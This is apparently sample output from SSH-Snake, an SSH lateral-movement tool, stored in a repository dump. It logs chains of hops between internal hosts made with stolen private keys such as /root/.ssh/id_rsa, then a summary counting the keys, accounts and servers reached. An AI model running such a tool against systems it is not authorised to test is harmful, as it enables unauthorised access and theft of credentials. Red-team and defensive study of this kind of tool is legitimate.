jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020349]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27\n[1704020349]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)\n[1704020349]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.26\n[1704020349]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.26)\n[1704020350]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.29\n[1704020350]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020350]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.28\n[1704020350]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020350]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@127.0.0.1\n[1704020350]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020351]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020351]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020351]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020351]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020351]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020351]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020352]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020352]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020352]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020352]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020353]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020353]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020353]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28\n[1704020353]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020353]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020353]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020354]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020354]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020354]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020354]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020354]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020354]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020354]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020355]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020355]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020355]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020355] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020355] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020355] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020355] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020356] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020356] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020356] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020356] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n\n\n\n               ______\n          _.-\"\"      \"\"-._\n       .-'                `-.\n     .'      __.----.__      `.\n    /     .-\"          \"-.     \\\n   /    .'                `.    \\\n  J    /                    \\    L\n  F   J                      L   J\n J    F                      J    L\n |   J                        L   |\n |   |                        |   |\n |   J                        F   |\n J    L                      J    F\n  L   J   .-\"\"\"\"-.           F   J\n  J    \\ /        \\   __    /    F\n   \\    (|)(|)_   .-'\".'  .'    /\n    \\    \\   /_>-'  .<_.-'     /\n     `.   `-'     .'         .'\n       `--.|___.-'`._    _.-'\n           ^         \"\"\"\"\n\n           ..             ..\n          ( '`<          ( '`<  ...Summary Report:\n           )(             )(\n    ( ----'  '.    ( ----'  '.\n    (         ;    (         ;\n     (_______,'     (_______,'\n~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^\n\nUnique private keys discovered: 8\nUnique shell accounts accessed: 10\nUnique servers accessed: 5\n\nNeed a list of servers accessed? Run one of these commands:\n\ngrep -oE \"[a-z_][a-z0-9_-]{0,31}@[0-9\\.]*$\" output.log  | sort -u\ngrep -oE \"[a-z_][a-z0-9_-]{0,31}@\\([0-9\\.:]*\\)$\" output.log  | sort -u\n\n-- https://joshua.hu/ --\n-- https://github.com/MegaManSec/SSH-Snake --\n\nThanks for playing!\n"
        },
        {
          "name": "tools",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}